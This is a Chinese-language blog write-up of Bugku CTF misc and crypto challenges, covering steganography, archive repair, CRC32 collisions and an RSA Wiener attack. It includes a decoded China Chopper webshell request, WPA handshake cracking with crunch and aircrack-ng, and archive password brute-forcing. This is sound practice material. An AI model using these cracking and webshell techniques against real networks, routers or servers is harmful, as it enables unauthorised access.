文件头：7B5C727466 XML (xml)， 文件头：3C3F786D6C HTML (html)， 文件头：68746D6C3EEmail [thorough only] (eml)， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596 RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D546864 用UE打开，敏感发现50 4B 03 04 改后缀为.zip，解压发现word文档，打开错误，UE发现word文档开头还是 50 4B 03 04 继续改为zip后缀 解压后在 word文件夹下的document.xml发现flag flag{F1@g} 又一张图片，还单纯吗用binwalk分解没成功，用foremost分解得到另外一张图片 flag falg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57} 猜百度识图 flag key{liuyifei} 宽带信息泄露题目中给出一个conf.bin文件，主要是工具，用routerpassview打开，然后找到username题目中给出了提示，flag是宽带用户名。 flag{053700357621} 隐写2binwalk 分解得到 flag.rar 提示.jpg 压缩包解压需要密码，尝试了一下不是伪加密，使用ARCHPR爆破得到密码 解压得到3.jpg，UE发现3.jpg 文件尾后面有 f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 把{}里base64解码一下，把f1@g 改为 flag flag{y0u Are a h@cker!} 多种方法解决UE打开是个base64之后的图片 base64转图片的网址：http://www.vgot.net/test/image2base64.php? 注意base64转图片时，前面data:image/jpg;base64, 去掉 转了之后得到一张二维码 识别二维码：https://cli.im/deqr KEY{dca57f966e4e4e31fd5b15417da63269} linux解压，UE打开，发现很多都是00，直接搜索key key{feb81d3834e2423c9903f4755464060b} 中国菜刀追踪TCP流 base64解码 12@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$F=&quot;C:\\wwwroot\\flag.tar.gz&quot;;$fp=@fopen($F,&apos;r&apos;);if(@fgetc($fp))&#123;@fclose($fp);@readfile($F);&#125;else&#123;echo(&apos;ERROR:// Can Not Read&apos;);&#125;;echo(&quot;X@Y&quot;);die();Ü 发现 flag.tar.gz 提取出来解压得到flag.txt key{8769fe393f2b998fa6a11afe2bfcd65e} 这么多数据包根据提示要找getshell流，wireshark打开CTF.pcagng先大致浏览一下，不难发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描 追踪流——&gt;TCP可以看到其中有一个s4cr4t.txt的文件，base64解码得到flagQ0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ== CCTF{do_you_like_sniffer} 隐写3一看这图片就是被裁剪了，UE修改一下大小就看到flag了 flag{He1l0_d4_ba1} 做个游戏(08067CTF)这里用Java Decompiler 工具反编译。 flag{RGFqaURhbGlfSmlud2FuQ2hpamk=} flag{DajiDali_JinwanChiji} 想蹭网先解开密码hint flag格式：flag{你破解的WiFi密码} tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你1391040\Goodluck!! 作者@NewBee 提示WIFI密码为手机号。下载下来是一个cap包，用wireshark打开。WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下—— 正好四个包，接下来就是破解密码了，因为已经给了11位手机号的前七位，使用crunch生成一个密码字典，然后进行破解 Linux密码生成工具crunch使用攻略 crunch 11 11 -t 1391040%%%% &gt;&gt;wifipassword.txt aircrack-ng wifi.cap -w wifipassword.txt 参数选择3 因为前两个为空 KEY FOUND! [ 13910407686 ] 可以用脚本写字典 1234567891011s = "1391040"t = ""file = open('data.txt','w')for i in range(10): for j in range(10): for k in range(10): for l in range(10): t = s + str(i) + str(j) + str(k) + str(l) file.write(t) file.write('\n') file.close()file.close() Linux2跟Linux1 一样，解压之后UE搜索 KEY{24f3627a86fc740a7f36ee2c7a1c124a} 账号被盗了 下载个CF外挂的exe 用wireshark抓包，exe账号密码随便写 然后过滤smtp，追踪TCP。圈起来的base64解码是163邮箱的账号和密码，登录找到flag flag{182100518+725593795416} 细心的大象解压得到一张大象的图片 binwalk看一看发现后面有RAR 分解得到个加密的压缩包 查看大象的图片属性，备注有个字符串 TVNEUzQ1NkFTRDEyM3p6 base64解码 MSDS456ASD123zz 用这个去解密压缩包，得到2.jpg 修改一下图片大小看到flag BUGKU{a1e5aSA} 爆照(08067CTF) flag格式 flag{xxx_xxx_xxx} binwalk一看有压缩包，但binwalk分解失败，用foremost分解得到一个zip zip解压得到8张jpg和一张gif（直接解压出错，得用命令unzip解压） 88:二维码扫描得bilibili 888:复制到windows10，加上jpg，查看属性备注有字符串，base64解码得silisili 8888:binwalk发现有zip，解压得二维码，扫描得panama flag{bilibili_silisili_panama} 图穷匕见查看属性 UE查看，jpg FF D9文件尾后面还有很多数字 提取出来，用notepad++的Converter 16进制-&gt;ASCII方式解码 这是坐标的形式 这时候再结合会画图吗的提示，将这些坐标做成一张图即可，用gnuplot这个工具比较方便，因此将坐标转为gnuplot能识别的格式 坐标1 坐标2 kali安装gnuplot：sudo apt-get install gnuplot-x11plot “/root/Desktop/111.txt”但windows下是使用 plot “C:\Users\Asus\Desktop\111.txt” 123root@kali:~/Desktop/Bugku# gnuplotgnuplot&gt; plot &quot;paintpaintpaint.txt&quot;注意调整一下比例，弄得高一点就可以扫描成功 flag{40fc0a979f759c8892f4dc045e28b820} 参考：https://www.cnblogs.com/WangAoBo/p/6950547.html convert题目给了一串二进制字符，转为16进制 ,52617221是RAR的文件头， 1526172211A0700CF907300000D00000000000000F7C07420902C000D09000059220000023E6370190A59B34A1D330700200000006B65792E6A706700F014A319101D911508917C9015EACB02ECD08228A0B868B4D082A05DB62880816089A944DAA0A0DA68B3426CB02CC44D29A1445404474882209A501D06C5411514313101044D5DC6C050B5440C14B4103B1607446C0E0F71EB11DF1CCEF7C33C4FB91313C999FAA7EE4C473C262BF989D1F54CCD4E88FA3F7EA9F0A88A8A8A889AAAF09889C7F463FEC0D2ADABAD2B8036580DF85E031FD3A5AC567C6F6DCC2B8B80D783281200F0CDE031C943050297464341E070CBB4AD050F80202966E146372501F14FB13A3E058B645BF47C0B162D91A06FC683C257B22568F8162C5B23EBA3E058B64559980E407C03704F4B03C01EC0B806502B0090374599029F99C6854DC72570C946017729FF72D881BC03EFD8CAB0565CCFB702A04F5D0A7E63E0E4AFA170B9045DCC2E794424FE3E30072AB02B2A312EB0278A20D692E0EAD84053D6C52860A4722F0DEE798D696D6052DAF2B7D07A4C1BAE4814D6D8DA3C8F05E453B111FC16F79246A1748B09B66E7979754F162DCDE1287B5BA701B129A9D1C85BE0F751615A05814073E3A8F6A716C2F3FAC90CD45451BDF494A8C29BDAF3032ECD7062E3AAAB63737ACBEBBB630BEEE989A9F5C5A939AD18729690D541F13DF1C9D5C8BD878AFA7C1CD6B32A8A17DAFC9E17BE84E1684A4A0EED6DA9EC1B757FE0A850971FF1F18F796253DA5A53A3B90CE153B24163068B1A352422A92F049CCBF1F124BBD0D085E6822FFE2404AE2BFB01A3E4058B6473FB8D1F202C58B647AFFEC83F1A55B63985A497B0B48AC7B402A804999988333212232C3434126A6E77A437363637D569B4E72767FAB4140CBCF8F852225230A424843CC28FB4D7240CD8ECB2841464E514D1AA09497B21BA16018D3242F6373DD2690F46EB0FB5837267E3D300E84816415A1C32100C0E8307CBB1FC00410BA930C836547DF63D0C601CC4CB3B012686A6C1149ED29761758730310E646462621557E0AB80C4E8CB4DACD8AA19E9D7C78842763B1B0315D31287B6EC77B50C15B7C8897C077822FCD49E1EEAB568BAD4647D76BF65B34CDA26A727AAEDD595D6165696D85898D919777BC666A0B60D20DCDEE0F0F245E9EDF093EC1F1212161A1F8BC68B8CE5C6F323B9BCEE7C97524E53AB2B2D2F31D9ED4ECF4FD050D151D3F7FC1E1A8F178EA6AABBCD5F61E7B1F45959FA49DC5CDD7ABD7777852FF03F7C1F87C708AFCB0F4319CF38386FB8CADE7590E7AB9EB1888CAC6627BD028745C39EB19E99517C40F76D3A1161277B6CF672434434B60BED416ADCF551365E945BFD0C6FFD47F4F1A82C9EBC9CFE319B301B87C90C0EB3A700E06161A3C9401AFFFACD54751096D052D73DA3E0CBB3892562899A55DF576FF9526B3D394B3E1DFA8CB07A5D5E372FC8A74B070B691F71AAC3B099FCED19FAA473A9E43074532A0420C6BBA969AB27717714D58ACECE713EBF7A47A3D7B58711832DF30DD55C9469F63D76B61C28B42854385C4AF0D656CD0CF64ADEAB5F2456B5DA8BF532648CDED71312D18C6471491C949C814B28D6F971BAA1AFC16E9A9A2641B63C359A5CE909A258E0F01B26E0E2B455576A2CE2B799D7A94D29A04D91EE242239BA489B6B358717FFBB541F1BBA277E25384729C6A922755EC140C87BC18A4A2D5CF799A9D182528B5053985192CD147C1694C071A8265DBAD793F187A43B9045DEC6401C61F62F3D33DE514D4E21A536D6A12DA085F8DB7472256E625EA77B1757F6B61206FBC6F3C5237A27EDE29AB48382CA960458CD8AC9CAE4F76E7FB911573FCE45E4A6DAC321ECFCAF921507455CEF6DC44F37F1266935EEDC86EBEE9422647FA7D9106D24C4B49637B3B445593D4E9B17E24F45858A3E1D7984F7B48B7EB0E777ACFBBDC470F61EEF569ED1586C118C39F07B4CD32249BF9D4E42FB87C7C8A592E4D002E0F9976B7D88BCB33BB0A995A48B27BBEEB51AC7F921D3F7FC32313713876DF87751BDB4CE1BD5CC63C12E2D04F01F5A2325F5B3528A9C2875F6CDEFB9456136630F0A1D2540737471E2A7A36AE4C6A95336D34EA432BA6B0620FC6B6C6A320EB5EB854489852657AAF12965158E05139C09136E2DFEAE9D8ED9024385EC292F14BBF54848621F414EAD571B16C1F9029FE3EBA6D4CAEE3A2CF6D2CDAC075BAC65D1085C9D2159FB76725EE23D33B3C9F918E20BDB481C56E30A62B08D6B221729503198C8B2506C4B8161DB52F4B23468C71E256FC12597C2802894D20FB68F6E93E3CFBBCBEEF19471AC01A8C910D77AE8029FF7FD35F66FC81515A568FDEEB51ED1986CB42CA83703843FBA4C6F99BB32972D47AE7C8514730FF1005C972B9D7FA103975DB6D198F311A2AB4FF55E6F780920B3139D5526A283DFFD2552B9712EDF946C4C444D0A3272366E3F9F7E8D139FBD4BAB222FA0FCF38CD77A9E43AE82B60B59C145640B21EC9A7E1EDA5C3D3B2CE58F34AD2D3DB8AB1237895253D0F4D30870FF298345FF2A72949D76FDE471C0EB9DD436351D4FCFD93536CFDED5B6CBF52F06EECA0C9370E433214DFE49DECE8B2B0EE4E75A57A99A8EB291D30EE98B0624E3DEC97DCDE656F3ACCDBAFB9432B0C7D8DA8A2B8166EE367F1ECB6D04FF1ED2A291A949C209FD2D9D48CAB7E1BE38AE2762BD028713D07D1B43C05D953B8029D4B5E64BE045D541DD617896EFD04F3C3D65A9951BD9970BE34E2E046C3A6AFD63AB8DB6C3F5EEA3DA55E70DCD927B0746377A4E14C87066EC39B8F9A49FD19A8BB1D24825447AA0ECCB8C8FE1D5DE3D71E5A479CFB03ED70C37C827439BBA3E0B037E76132A670570C3DDAB3BDBA55F9BF750E76084BCCCD0EE5D2863B7BEBE302F540F0C5629DE8C7C19E012F1517587719FF00DFB59EECDC37C98F7C22A1724EEE7FCE36EEC62D414E0AA861CA760CB76DA65AA49B49CF79467A26AB64C04D66C8E1950E0D4CFD760DB7907266CDB8D871227511096800A99B11E0305D3C71A0D3B779D17A90833005FE57F6F35699EBAD7A7A0FC8188BB5F010F1F507501F3F3D446939ADA2BF6B533EFA7F8028A3D3BF8AD6B0CE3A03E0E3B08F3F48428767B5B4E3AD1D7EDD8BDB0B1B1E6A64E49E730E512CC7E8CC305709CE8903D9CA6C3B75B3D2C4665B79E8F290F2FDF449982D740CAAB1DAF06FE565C6C64C4AA39AF619691338D643DD789C1428CAAE4E2447C986EFEA0497F365767FD7A60A3DB3A152AFC3470DD2627FB569FAF6BC75E8BBA5D9280D55D2C62F87E72FB698C5B00F77AEAFFE74DFE8308C7B2FF28C43D7B00400700 把这16进制串写入RAR，解压得到一张图片 查看图片属性，发现base64，解码 flag{01a25ea3fd6349c6e635a1d0196e75fb} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/5/20 9:44# @Author : Lhaihai# @File : 多种进制转换.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""import binascii__author__ = 'Mang0'# !/usr/bin/env python# -*- coding: utf-8 -*-base = [str(x) for x in range(10)] + [chr(x) for x in range(ord('A'), ord('A') + 6)]# bin2decdef bin2dec(string_num): return str(int(string_num, 2))# hex2decdef hex2dec(string_num): return str(int(string_num.upper(), 16))# dec2bindef dec2bin(string_num): num = int(string_num) mid = [] while True: if num == 0: break num, rem = divmod(num, 2) mid.append(base[rem]) return ''.join([str(x) for x in mid[::-1]])# dec2hexdef dec2hex(string_num): num = int(string_num) mid = [] while True: if num == 0: break num, rem = divmod(num, 16) mid.append(base[rem]) return ''.join([str(x) for x in mid[::-1]])# hex2tobindef hex2bin(string_num): return dec2bin(hex2dec(string_num.upper()))# bin2hexdef bin2hex(string_num): return dec2hex(bin2dec(string_num))if __name__ == '__main__': file1 = open(r'E:\CTF\misc\Bugku\1.txt') s = file1.read() hexx = bin2hex(s) print (hexx) file2 = open(r'E:\CTF\misc\Bugku\cover.rar', 'wb') file2.write(binascii.a2b_hex(hexx)) 听首音乐 解压有个wav的音频 用Audacity打开，，发现上面有一串点横，联想到摩斯密码 ····· -··· -·-· —-· ··— ····· -···· ····- —-· -·-· -··· —– ·—- —·· —·· ··-· ····· ··— · -···· ·—- –··· -·· –··· —– —-· ··— —-· ·—- —-· ·—- -·-· 注意要把小写字母转为大写 5BC925649CB0188F52E617D70929191C 好多数值 flag格式 flag{} 下载打开一看，RGB，图片大小不知道大佬们怎么测试出来的 12345678910111213141516171819202122232425262728#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/5/12 0:42# @Author : Lhaihai# @File : RGB转jpg.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : """from PIL import Imageimport rex = 503 #x坐标 通过对txt里的行数进行整数分解y = 122 #y坐标 x*y = 行数im = Image.new("RGB",(x,y))#创建图片file = open(r'E:\CTF\misc\Bugku\1 (1).txt') #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x): for j in range(0,y): line = file.readline()#获取一行 rgb = line.split(",")#分离rgb im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.show()# im.save('qqq.jpg') flag{youc@n’tseeme} 很普通的数独(ISCCCTF)UE查看，开头是50 4B 03 04 ，zip的文件头 加上zip后缀，解压出一丢图片 iscc的脑洞题，不想做了，放下表哥的writeup http://blog.chrstm.com/2017/05/29/ISCC2017/ http://isron.cn/2017/05/24/ISCC-shudu/ flag{y0ud1any1s1} 好多压缩包123.zip里有68个压缩包，每个压缩包里都有个data.txt，大小只有4，应该就是CRC32碰撞了 代码在python2.7环境下运行，跑得有点久 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/python2.7# -*- coding: utf-8 -*-# @Time : 2018/5/20 12:43# @Author : Lhaihai# @File : CRC32碰撞.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""# coding:utf-8import zipfileimport stringimport binasciiimport base64def CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): # print s f.write(s) returndef CrackZip(): for I in range(68): file = r'E:\CTF\misc\Bugku\123\out' + str(I) + '.zip' f = zipfile.ZipFile(file, 'r') GetCrc = f.getinfo('data.txt') crc = GetCrc.CRC CrackCrc(crc)dic = string.ascii_letters + string.digits + '+/='f = open(r'E:\CTF\misc\Bugku\123\out.txt', 'w')CrackZip()f.close() 得到碰撞出来的值， z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA== base64解码后转为16进制 注意不能找在线的base64解码，会漏掉00。16进制保存在winhex里 cf90 7300 000d 0000 0000 0000 00aa 3e7a0080 2300 4900 0000 5400 0000 0286 34abfe6b 631d 491d 3303 0001 0000 0043 4d540915 14cb dd41 4f95 2448 d3e8 8f98 45115141 46f7 9f1d 2042 7c6d 2bb8 69ca 9f282c33 28fc 4816 991f 1b18 1d8f 382c 4676e1c5 ed67 4d72 de4d 4ad5 8274 be92 bd1f0a94 cdbe aef7 3f22 804a f774 2090 2d001d00 0000 1d00 0000 0262 d1e7 d54f 631d491d 3008 0020 0000 0066 6c61 672e 74787400 b034 6966 6669 7820 7468 6520 66696c65 2061 6e64 2067 6574 2074 6865 20666c61 67c4 3d7b 0040 0700 1234567891011121314151617181920#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/5/20 14:05# @Author : Lhaihai# @File : bugku-base64解码.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""import base64f = open(r'E:\CTF\misc\Bugku\123\out.txt', 'r')s = f.read()text = base64.b64decode(s)print(text)ff = open(r'E:\CTF\misc\Bugku\123\rrr.txt', 'wb')ff.write(text)f.close()ff.close() 可以看到fix the file and get the flag得知我们需要修复文件就可以得到flag： 我们知道C4 3D 7B 00 40 07 00为rar文件的十六进制结尾，所以我们需要在文件头部添加rar文件的十六进制头52 61 72 21 1A 07 00，然后另存为rar文件。打开rar文件，在注释中得到flag： flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip} 参考： https://www.cnblogs.com/WangAoBo/p/6951160.html 一个普通的压缩包(xp0intCTF)解压有flag.rar，flag.rar解压有个flag.txt，flag.txt显示flag is not here 找writeup，修改下图圈出来的为74 这时候发现flag.rar有个secret.png png查看16进制，发现是GIF开头，改为gif后缀，2345看图王分解为两帧，然而2345看图王分解的帧用stegsolve看不到二维码，后来用firework弄两个gif，一个gif删去状态1，一个gif删除状态2 用windows自带的画图工具拼接起来 上面左边和右边的角缺失了，可以拿左下角的复制过去补一补 flag{yanji4n_bu_we1shi} 参考：https://www.cnblogs.com/blili/p/9013555.html 妹子的陌陌 想要妹子陌陌号吗？做题来拿吧 下载这个图片做题 http://120.24.86.145:8002/misc/momo.jpg 虽然今天520对我来说没关系，但我一定要贴这个题目的妹子出来 binwalk发现有RAR，分解出来，RAR需要密码 尝试多种方法解密不成功，看看大佬writeup，密码就是妹子图片红色字:喜欢我吗. momo.txt 嘟嘟嘟嘟士兵：报告首长！已截获纳粹的加密电报！首长：拿来看看 电报内容：····/-/-/·–·/—···/-··-·/-··-·/·/-·/-·-·/—/-··/·/·-·-·-/-·-·/····/·-/····/··-/—/·-·-·-/-·-·/—/–/-··-· 首长：我操你在逗我吗？你确定是他们纳粹发的吗？士兵：难道我弄错了？哦。。。等等是这一条 内容：http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0= AES Key：@#@#￥%……￥￥%%……&amp;￥ 士兵：二维码真的扫不出来吗？？肯定可以扫出来 摩斯密码解密得一个网址 http://encode.chahuo.com/ 打开一看是一个解密的，再看看 http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0= AES Key：@#@#￥%……￥￥%%……&amp;￥ 拿网址U2F这串字符去AES解密，得momoj2j.png 访问 http://c.bugku.com/momoj2j.png 看到一个二维码，一看就是黑白反转了 拿stegsolve反转一下，扫描二维码得 KEY{nitmzhen6} 就五层你能解开吗 链接: http://pan.baidu.com/s/1i4TQoz7 密码: w65m 提示： 第一层：CRC32 碰撞 第二层：维吉尼亚密码 第三层：sha1 碰撞 第四层：md5 相同文件不同 第五层：RSA 第一层 CRC32 碰撞打开压缩包，发现大小都为6，可以用CRC32碰撞，大于6的基本不要用CRC32碰撞了 碰撞脚本：https://github.com/theonlypwner/crc32 从里面选取有意义的字符串连接起来。发现可以连成 _CRC32_i5_n0t_s4f3 输入密码解压。解压成功。 第二层 维吉尼亚密码 你知道维吉尼亚密码吗？我们给了keys.txt，唯一的密钥就在其中，那么解密ciphertext.txt里的密文吧！解压密码就在明文里，祝你好运！ Do you know the Vigenére Ciphers?We gave the keys.txt, Only have a key in it, So decrypts ciphertext.txt!Unzip Password in plaintext, good luck to you! 在线爆破vigenere ：https://www.guballa.de/vigenere-solver 但不对，在key里面找一找类似的 （直接writeup拿了） YEWCQGEWCYBNHDHPXOYUBJJPQIRAPSOUIYEOMTSV http://tool.bugku.com/jiemi/解密得 the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny 解压密码 vigenere cipher funny 第三层：sha1 碰撞12345678910111213141516171819202122恭喜!现在我们遇到一个问题,我们有一个zip文件,但我们不知道完整的解压密码。幸好我们知道解压密码的一部分sha1值。你能帮我们找到的密码吗?不完整的密码：&quot;*7*5-*4*3?&quot; *代表可打印字符不完整的sha1：&quot;619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*&quot; *代表可打印字符人生苦短，我用Python。Congratulations!Now we run into a problem,We have a zip file, but we don&apos;t know the complete unzip password.Fortunately, we know that part of the unzip password of sha1 value.can you help us to find the password?Incomplete password is &quot;*7*5-*4*3?&quot; * in the range of ASCII printable charactersIncomplete sha1 is &quot;619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*&quot; * in the range of ASCII printable charactersLife is short, you need Python. 那就上脚本把。 1234567891011121314import hashlibdic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+&#123;&#125;:&lt;&gt;?."for i1 in dic: for i2 in dic: for i3 in dic: for i4 in dic: fir = '*7*5-*4*3?' poc = i1+'7'+i2+'5-'+i3+'4'+i4+'3?' # print('%s'%(poc)) dest = '619c20c' next =hashlib.sha1(poc.encode('utf-8')).hexdigest() # print() if str(next).startswith(dest): print(poc+' '+next) 解压密码 I7~5-s4F3? 第四层：md5 相同文件不同 Hello World ;-)MD5校验真的安全吗？有没有两个不同的程序MD5却相同呢？如果有的话另一个程序输出是什么呢？解压密码为单行输出结果。 Hello World ;-)MD5 check is really safe?There are two different procedures MD5 is the same?If so what is the output of another program?The decompression password is a single-line output. https://blog.csdn.net/liangkwok/article/details/7441867 https://blog.csdn.net/sysprogram/article/details/73753354 摘录 两个程序的文件内容不一样，运行的效果打印的东西不一样，一个打印循环打印Goodbye World，一个只打印Hello world。但是md5却一样。 于是解压密码为 Goodbye World :-( 第五层：RSA 123456789101112131415161718192021222324252627282930313233&gt; openssl rsa -pubin -text -modulus -in rsa_public_key.pemPublic-Key: (1026 bit)Modulus: 02:8f:ff:9d:d3:e6:fe:97:81:64:9e:b7:fe:5e:93: 03:cf:69:63:47:c4:11:0b:c4:ba:39:69:f0:b1:16: 69:84:0c:51:d8:1a:68:42:b6:df:2b:09:0f:21:cd: 76:d4:37:1a:8c:0e:47:04:8c:96:5e:ca:5b:46:91: 3a:fb:b8:da:05:20:72:a0:56:6d:70:39:c6:18:ab: a9:06:57:59:b0:59:e2:9e:48:5d:c5:06:1a:16:ac: 63:12:94:38:d9:35:4e:65:df:57:47:54:6b:85:db: 3d:69:98:19:c4:b7:73:2d:f9:27:c7:08:4a:5d:52: d6:e6:d6:aa:c1:44:62:34:25Exponent: 01:f8:fb:a4:10:05:2d:f7:ed:a3:46:2f:1a:ac:d6: 9e:40:76:04:33:ca:33:57:67:cd:73:05:a3:d0:90: 80:5a:5f:d4:05:dd:6e:ea:70:e9:8f:0c:a1:e1:cf: 25:47:48:67:1b:f0:c9:80:06:c2:0e:ee:1d:62:79: 04:35:09:fe:7a:98:23:8b:43:91:60:a5:61:2d:a7: 1e:90:45:14:e8:12:80:61:7e:30:7c:3c:d3:31:3f: a4:c6:fc:a3:31:59:d0:44:1f:bb:18:d8:3c:af:4b: d4:6f:6b:92:97:a8:0a:14:2d:d6:9b:f1:a3:57:cc: b5:e4:c2:00:b6:d9:0f:15:a3Modulus=28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425writing RSA key-----BEGIN PUBLIC KEY-----MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQKP/53T5v6XgWSet/5ekwPPaWNHxBELxLo5afCxFmmEDFHYGmhCtt8rCQ8hzXbUNxqMDkcEjJZeyltGkTr7uNoFIHKgVm1wOcYYq6kGV1mwWeKeSF3FBhoWrGMSlDjZNU5l31dHVGuF2z1pmBnEt3Mt+SfHCEpdUtbm1qrBRGI0JQKBgQH4+6QQBS337aNGLxqs1p5AdgQzyjNXZ81zBaPQkIBaX9QF3W7qcOmPDKHhzyVHSGcb8MmABsIO7h1ieQQ1Cf56mCOLQ5FgpWEtpx6QRRToEoBhfjB8PNMxP6TG/KMxWdBEH7sY2DyvS9Rva5KXqAoULdab8aNXzLXkwgC22Q8Vow==-----END PUBLIC KEY----- 发现e很大，想到RSA的维纳攻击 github找了好几个，终于找到个能用的 https://github.com/orisano/owiener 1234567891011121314151617181920#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/5/20 15:55# @Author : Lhaihai# @File : RSAowiener.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""import owienere = 0x01f8fba410052df7eda3462f1aacd69e40760433ca335767cd7305a3d090805a5fd405dd6eea70e98f0ca1e1cf254748671bf0c98006c20eee1d6279043509fe7a98238b439160a5612da71e904514e81280617e307c3cd3313fa4c6fca33159d0441fbb18d83caf4bd46f6b9297a80a142dd69bf1a357ccb5e4c200b6d90f15a3n = 0x28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425d = owiener.attack(e, n)if d is None: print("Failed")else: print("Hacked d=&#123;&#125;".format(d)) 拿到d 8264667972294275017293339772371783322168822149471976834221082393409363691895 生成私钥 解密，打开flag.txt拿到flag openssl rsautl -decrypt -in flag.enc -inkey bugkursa.pem -out flag.txt 或者用脚本解密，来自http://www.test404.com/post-1107.html 1234567891011121314n=0x28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425e=0x1f8fba410052df7eda3462f1aacd69e40760433ca335767cd7305a3d090805a5fd405dd6eea70e98f0ca1e1cf254748671bf0c98006c20eee1d6279043509fe7a98238b439160a5612da71e904514e81280617e307c3cd3313fa4c6fca33159d0441fbb18d83caf4bd46f6b9297a80a142dd69bf1a357ccb5e4c200b6d90f15a3d=8264667972294275017293339772371783322168822149471976834221082393409363691895with open("flag.enc","rb") as f: data = f.read() data = data.encode("hex") c = int(data,16) mingwen = pow(c,d,n) print hex(mingwen) result = hex(mingwen)[2:-1] result = "0"+result result = result.decode("hex")with open("flag","wb") as f: f.write(result) flag{W0rld_Of_Crypt0gr@phy} 参考： https://blog.csdn.net/preserphy/article/details/79599397 http://wiki.idbg.net/docs/show/41 CRC32：http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/]]></content>
      <categories>
        <category>Misc</category>
        <category>Bugku-MISC</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一周RSA加密解密入门]]></title>
    <url>%2F2018%2F05%2F10%2F%E7%AC%AC%E4%B8%80%E5%91%A8%2F</url>
